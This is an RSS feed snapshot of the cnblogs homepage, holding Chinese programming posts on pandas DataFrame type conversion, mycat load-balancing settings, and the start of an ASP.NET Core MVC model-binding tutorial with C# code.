<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>改变Dataframe的列的数据类型 - 飞翔的南瓜</title>
<link>http://www.cnblogs.com/flying-pumpkin/p/12602920.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/flying-pumpkin/p/12602920.html</guid>
<description>&lt;p&gt;&lt;span&gt;　　&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、查看DataFrame的数据类型&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;prettyprint&quot;&gt;
&lt;span&gt;&lt;code class=&quot;has-numbering&quot;&gt;df.dtypes#查看各列数据类型
df[A].dtypes#查看A列数据类型&lt;/code&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;2、转换DataFrame的数据类型&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;prettyprint&quot;&gt;
&lt;span readability=&quot;2.5&quot;&gt;&lt;code class=&quot;has-numbering&quot; readability=&quot;5&quot;&gt;df[A].astypes(int)#将A列数据类型转换为int&lt;p&gt;data['note_n'] = pd.to_numeric(data['note_n'])&lt;/p&gt;&lt;p&gt;traindata=pd.DataFrame(traindata,dtype=np.float)&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;&lt;/span&gt;
&lt;/pre&gt;</description>
<pubDate>Tue, 31 Mar 2020 00:53:00 +0000</pubDate>
<dc:creator>飞翔的南瓜</dc:creator>
<og:description>1、查看DataFrame的数据类型 df.dtypes#查看各列数据类型 df[A].dtypes#查看A列数据类型 2、转换DataFrame的数据类型 df[A].astypes(int)#将A</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/flying-pumpkin/p/12602920.html</dc:identifier>
</item>
<item>
<title>mycat主要参数 - 小江子</title>
<link>http://www.cnblogs.com/Xiaojiangzi/p/12602922.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Xiaojiangzi/p/12602922.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;以下内容源于mycat官方文档，记录下来方便直接查看，原文链接：&lt;a href=&quot;http://www.mycat.io/document/mycat-definitive-guide.pdf&quot;&gt;http://www.mycat.io/document/mycat-definitive-guide.pdf&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;mycat版本：1.6&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;负载均衡类型&lt;/strong&gt;，目前的取值有 3 种：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1. balance=&quot;0&quot;, 不开启读写分离机制，所有读操作都发送到当前可用的 writeHost 上。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2. balance=&quot;1&quot;，全部的 readHost 与 stand by writeHost 参与 select 语句的负载均衡，简单的说，当双&lt;/span&gt;&lt;br/&gt;&lt;span&gt;主双从模式(M1-&amp;gt;S1，M2-&amp;gt;S2，并且 M1 与 M2 互为主备)，正常情况下，M2,S1,S2 都参与 select 语句的负载&lt;/span&gt;&lt;br/&gt;&lt;span&gt;均衡。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;3. balance=&quot;2&quot;，所有读操作都随机的在 writeHost、readhost 上分发。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;4. balance=&quot;3&quot;，所有读请求随机的分发到 wiriterHost 对应的 readhost 执行，writerHost 不负担读压&lt;/span&gt;&lt;br/&gt;&lt;span&gt;力，注意 balance=3 只在 1.4 及其以后版本有，1.3 没有。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;负载均衡类型&lt;/strong&gt;，&lt;/span&gt;目前的取值有 3 种：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1. writeType=&quot;0&quot;, 所有写操作发送到配置的第一个 writeHost，第一个挂了切到还生存的第二个&lt;/span&gt;&lt;br/&gt;&lt;span&gt;writeHost，重新启动后已切换后的为准，切换记录在配置文件中:dnindex.properties .&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2. writeType=&quot;1&quot;，所有写操作都随机的发送到配置的 writeHost，1.5 以后废弃不推荐。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;switchType 属性：&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;-1 表示不自动切换&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1 默认值，自动切换&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2 基于 MySQL 主从同步的状态决定是否切换&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 31 Mar 2020 00:53:00 +0000</pubDate>
<dc:creator>小江子</dc:creator>
<og:description>以下内容源于mycat官方文档，记录下来方便直接查看，原文链接：http://www.mycat.io/document/mycat-definitive-guide.pdf mycat版本：1.6</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Xiaojiangzi/p/12602922.html</dc:identifier>
</item>
<item>
<title>通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[下篇]：参数绑定 - Artech</title>
<link>http://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-03.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-03.html</guid>
<description>&lt;p&gt;模拟框架到目前为止都假定Action方法是没有参数的，我们知道MVC框架对Action方法的参数并没有作限制，它可以包含任意数量和类型的参数。一旦将“零参数”的假设去除，ControllerActionInvoker针对Action方法的执行就变得没那么简单了，因为在执行目标方法之前需要绑定所有的参数。MVC框架采用一种叫做“模型绑定（Model Binding）”的机制来绑定目标Action方法的输出参数，这可以算是MVC框架针对请求执行流程中最为复杂的一个环节，为了让读者朋友们对模型绑定的设计和实现原理有一个大致的了解，模拟框架提供一个极简版本的实现。源代码从&lt;a href=&quot;https://files.cnblogs.com/files/artech/S504.7z&quot;&gt;这里&lt;/a&gt;下载。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;目录&lt;br/&gt;一、数据项的提供&lt;br/&gt;     IValueProvider&lt;br/&gt;     IValueProviderFactory&lt;br/&gt;二、模型绑定&lt;br/&gt;     ModelMetada&lt;br/&gt;     IModelBinder&lt;br/&gt;     IModelBinderProvider&lt;br/&gt;     IModelBinderFactory&lt;br/&gt;三、简单类型绑定&lt;br/&gt;四、复杂类型绑定&lt;br/&gt;     针对属性成员的递归绑定&lt;br/&gt;     针对反序列化的绑定&lt;br/&gt;五、绑定方法的参数&lt;br/&gt;六、实例演示&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;虽然MVC框架并没有数据来源作任何限制，但是模型绑定的原始数据一般来源于当前的请求。除了以请求主体的形式提供一段完整的内容（比如JSON或者XML片段）并最终通过发序列化的方式生成作为参数的对象之外，HTTP请求大都会采用&lt;span&gt;键值对&lt;/span&gt;的形式提供一组候选的数据项作为模型绑定的数据源，比如请求URL提供的&lt;span&gt;查询字符串&lt;/span&gt;（Query String）、请求路径解析之后得到的&lt;span&gt;路由参数&lt;/span&gt;、&lt;span&gt;请求的首部集合&lt;/span&gt;、主体携带的&lt;span&gt;表单元素&lt;/span&gt;等。&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;IValueProvider&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;作为对这些采用键值对结构的原始数据项提供者的抽象，MVC框架提供了一个名为IValueProvider接口，模拟框架对该接口作了如下的简化。与具有唯一键的字典不同，作为模型绑定数据源的多个数据项可以共享同一个名称，并且它们基本以字符串的形式存在，所以IValueProvider接口定义了一个TryGetValues方法根据指定的名称得到一组以字符串数组表示的值。我们还为IValueProvider接口定义了一个ContainsPrefix方法来确定是否包含指定名称前缀的数据项。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IValueProvider
{
    &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; TryGetValues(&lt;span&gt;string&lt;/span&gt; name, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] values);
    &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; ContainsPrefix(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; prefix);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于数据来源的多样性，所以一个应用会涉及到针对多个IValueProvider对象的使用。不论模型绑定支持多少种数据源，如果我们总是能够使用一个单一IValueProvider对象来提供模型绑定的数据项，这无疑会使模型绑定的设计变得更加简单。对设计模式稍有了解的等着朋友应该会想到“组合模式”会帮我们实现这个目标，为此我们按照这样的模式定义了如下这个CompositeValueProvider类型。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CompositeValueProvider : IValueProvider
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; IEnumerable&amp;lt;IValueProvider&amp;gt;&lt;span&gt; _providers;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; CompositeValueProvider(IEnumerable&amp;lt;IValueProvider&amp;gt; providers) =&amp;gt; _providers =&lt;span&gt; providers;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; ContainsPrefix(&lt;span&gt;string&lt;/span&gt; prefix) =&amp;gt; _providers.Any(it =&amp;gt;&lt;span&gt; it.ContainsPrefix(prefix));
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; TryGetValues(&lt;span&gt;string&lt;/span&gt; name, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] value)
    {
        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; provider &lt;span&gt;in&lt;/span&gt;&lt;span&gt; _providers)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (provider.TryGetValues(name, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; value))
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (value = &lt;span&gt;null&lt;/span&gt;) != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下所示的ValueProvider类型是模拟框架提供的针对IValueProvider接口的模式实现。如代码片段所示，ValueProvider利用一个NameValueCollection来保存作为数据项的字符串键值对，值得一提的是，对于我们提供的这个NameValueCollection对象，它的Key是不区分大小写的。除了提供一个将NameValueCollection对象作为参数的构造函数之外，我们还提供了另一个构造函数，该构造函数将一个IEnumerable&amp;lt;KeyValuePair&amp;lt;string, StringValues&amp;gt;&amp;gt;对象作为数据的原始来源。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ValueProvider : IValueProvider
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; NameValueCollection _values; 
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ValueProvider Empty = &lt;span&gt;new&lt;/span&gt; ValueProvider(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; NameValueCollection());

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ValueProvider(NameValueCollection values) =&amp;gt; _values = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NameValueCollection(StringComparer.OrdinalIgnoreCase) { values };

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ValueProvider(IEnumerable&amp;lt;KeyValuePair&amp;lt;&lt;span&gt;string&lt;/span&gt;, StringValues&amp;gt;&amp;gt;&lt;span&gt; values)
    {
        _values &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; NameValueCollection(StringComparer.OrdinalIgnoreCase);
        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; kv &lt;span&gt;in&lt;/span&gt;&lt;span&gt; values)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; value &lt;span&gt;in&lt;/span&gt;&lt;span&gt; kv.Value)
            {
                _values.Add(kv.Key.Replace(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;), value);
            }
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; ContainsPrefix(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; prefix)
    {
        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;string&lt;/span&gt; key &lt;span&gt;in&lt;/span&gt;&lt;span&gt; _values.Keys)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (key.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; TryGetValues(&lt;span&gt;string&lt;/span&gt; name, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] value)
    {
        value &lt;/span&gt;=&lt;span&gt; _values.GetValues(name);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; value?.Any() == &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;IValueProviderFactory&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;顾名思义，IValueProviderFactory接口代表创建IValueProvider对象的工厂。如下面的代码片段所示，IValueProviderFactory接口定义了唯一的CreateValueProvider方法，该方法根据提供的ActionContext上下文创建出对应的IValueProvider对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IValueProviderFactory
{
    IValueProvider CreateValueProvider(ActionContext actionContext);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果我们需要为模型绑定提供针对某项数据源的支持，我们只需要定义和注册针对IValueProviderFactory接口的实现类即可。如下所示的三个类型（QueryStringValueProviderFactory、HttpHeaderValueProviderFactory和FormValueProviderFactory）会将请求的查询字符串、首部集合和提交表单作为模型绑定的数据源。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; QueryStringValueProviderFactory : IValueProviderFactory
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IValueProvider CreateValueProvider(ActionContext actionContext)  =&amp;gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ValueProvider(actionContext.HttpContext.Request.Query);
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HttpHeaderValueProviderFactory : IValueProviderFactory
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IValueProvider CreateValueProvider(ActionContext actionContext)  =&amp;gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ValueProvider(actionContext.HttpContext.Request.Headers);
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FormValueProviderFactory : IValueProviderFactory
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; IValueProvider CreateValueProvider(ActionContext actionContext)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; contentType =&lt;span&gt; actionContext.HttpContext.Request.GetTypedHeaders().ContentType;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; contentType.MediaType.Equals(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;? &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ValueProvider(actionContext.HttpContext.Request.Form)
        : ValueProvider.Empty;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;模型绑定最终是通过相应的IModelBinder对象完成的，具体的IModelBinder对象是根据描述待绑定模型的元数据来提供的。模型元数据不仅决定了实施绑定的IModelBinder对象的类型，还为模型绑定提供了必要的元数据。&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;ModelMetada&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;模拟框架利用如下这个ModelMetadata对模型元数据进行了极大的简化。由于模型绑定最终的目的是为了提供Action方法的某个参数值，所以用来控制或者辅助绑定的元数据可以通过描述参数的ParameterInfo对象提取出来。针对复合对象的模型绑定是一个递归的过程：先创建一个空的对象，并采用同样的模型绑定机制去初始化相应的属性，所以针对该属性的模型元数据应根据对应的PropertyInfo对象来创建。ModelMetadata提供了两个静态工厂方法来完成上述两种针对ModelMetadata对象的创建。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ModelMetadata
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ParameterInfo Parameter { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; PropertyInfo Property { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Type ModelType { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; CanConvertFromString { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; ModelMetadata(ParameterInfo parameter, PropertyInfo property)
    {
        Parameter &lt;/span&gt;=&lt;span&gt; parameter;
        Property &lt;/span&gt;=&lt;span&gt; property;
        ModelType &lt;/span&gt;= parameter?.ParameterType ??&lt;span&gt; property.PropertyType;
        CanConvertFromString &lt;/span&gt;= TypeDescriptor.GetConverter(ModelType).CanConvertFrom(&lt;span&gt;typeof&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;));
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ModelMetadata CreateByParameter(ParameterInfo parameter) =&amp;gt; &lt;span&gt;new&lt;/span&gt; ModelMetadata(parameter, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ModelMetadata CreateByProperty(PropertyInfo property) =&amp;gt; &lt;span&gt;new&lt;/span&gt; ModelMetadata(&lt;span&gt;null&lt;/span&gt;&lt;span&gt;, property);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ModelMetadata的ModelType属性表示待绑定的目标类型。按照采用的绑定策略的差异，我们将待绑定的数据类型划分为两种类型——&lt;span&gt;简单类型&lt;/span&gt;和&lt;span&gt;复杂类型&lt;/span&gt;。对于一个给定的数据类型，决定它属于简单类型还是复杂类型却决于：&lt;span&gt;是否支持源自字符串类型的类型转换&lt;/span&gt;。之所以采用是否支持源自字符串类型的转换作为复杂类型和简单类型的划分依据，是因为IValueProvider提供的原子数据项封装的原始数据就是一个字符串，如果目标类型支持源自字符串的类型转换，对应的绑定只需要将原始数据转换成目标类型就可以了。待绑定数据类型是否支持源自字符串的类型转换可以通过ModelMetadata类型的CanConvertFromString属性来决定。&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;IModelBinder&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;如下所示的是用于实施模型绑定的IModelBinder接口的定义。如代码片段所示，IModelBinder接口定义了唯一的方法BindAsync方法在通过参数表示的绑定上下文中完成模型绑定。作为模型绑定上下文的ModelBindingContext对象承载了用来完成模型绑定的输入和辅助对象，完成绑定得到的模型对象最终也需要附加到此上下文中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IModelBinder
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task BindAsync(ModelBindingContext context);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;被模拟框架简化后的绑定上下文体现为如下这个ModelBindingContext类型。前面四个属性（ActionContext、ModelName和ModelMetadata和ValueProvider）是为模型绑定提供的输入，分别表示当前ActionContext上下文、模型名称、模型元数据和提供原子数据源的IValueProvider对象，其中表示模型名称的ModelName为我们提供从IValueProvider对象提取对应数据项的Key。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ModelBindingContext
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ActionContext ActionContext { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; ModelName { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ModelMetadata ModelMetadata { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IValueProvider ValueProvider { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;object&lt;/span&gt; Model { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; IsModelSet { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ModelBindingContext(ActionContext actionContext, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; modelName, ModelMetadata modelMetadata, IValueProvider valueProvider)
    {
        ActionContext &lt;/span&gt;=&lt;span&gt; actionContext;
        ModelName &lt;/span&gt;=&lt;span&gt; modelName;
        ModelMetadata &lt;/span&gt;=&lt;span&gt; modelMetadata;
        ValueProvider &lt;/span&gt;=&lt;span&gt; valueProvider;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Bind(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; model)
    {
        Model &lt;/span&gt;=&lt;span&gt; model;
        IsModelSet &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ModelBindingContext类型的Model和IsModelSet属性作为模型绑定的输出，前者表示绑定生成的目标对象，后者则表示是否绑定的目标对象是否成功生成并赋值到Model属性上（不能通过Model属性是否返回Null来决定，因为绑定生成的目标对象可能就是Null）。我们将Model和IsModelSet都定义成私有属性，因为我们希望通过Bind方法来对它们进行赋值。&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;IModelBinderProvider&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;IModelBinder对象由对应的IModelBinderProvider对象来提供。如下所示的是模拟框架对该接口的简化定义，如代码片段所示，IModelBinderProvider接口定义了唯一的GetBinder方法根据提供的用于描述待绑定模型元数据的ModelMetadata对象来提供对应的IModelBinder对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IModelBinderProvider
{
    IModelBinder GetBinder(ModelMetadata metadata);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;IModelBinderFactory&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;一般来说，每个具体的IModelBinder实现类型都具有一个对应的IModelBinderProvider实现类型，所以ASP.NET Core应用采用注册多个IModelBinderProvider实现类型的方式来提供针对不同模型绑定方式的支持。最终针对IModelBinder对象的提供体现为如何根据待绑定模型元数据选择正确的IModelBinderProvider对象来提供对应的IModelBinder对象，这一功能是通过IModelBinderFactory对象来完成的。如下面的代码片段所示，IModelBinderFactory接口定义了唯一的CreateBinder方法根据提供的模型元数据来创建对应的IModelBinder对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IModelBinderFactory
{
    IModelBinder CreateBinder(ModelMetadata metadata);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下所示的ModelBinderFactory类型是模拟框架提供的针对IModelBinderFactory接口的默认实现。一个ModelBinderFactory对象是对一组IModelBinderProvider对象的封装，在实现的CreateBinder方法中，它通过遍历这组IModelBinderProvider对象，并返回第一个提供的IModelBinder对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ModelBinderFactory : IModelBinderFactory
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; IEnumerable&amp;lt;IModelBinderProvider&amp;gt;&lt;span&gt; _providers;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ModelBinderFactory(IEnumerable&amp;lt;IModelBinderProvider&amp;gt; providers) =&amp;gt; _providers =&lt;span&gt; providers;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; IModelBinder CreateBinder(ModelMetadata metadata)
    {
        &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; provider &lt;span&gt;in&lt;/span&gt;&lt;span&gt; _providers)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; binder =&lt;span&gt; provider.GetBinder(metadata);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (binder != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; binder;
            }
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

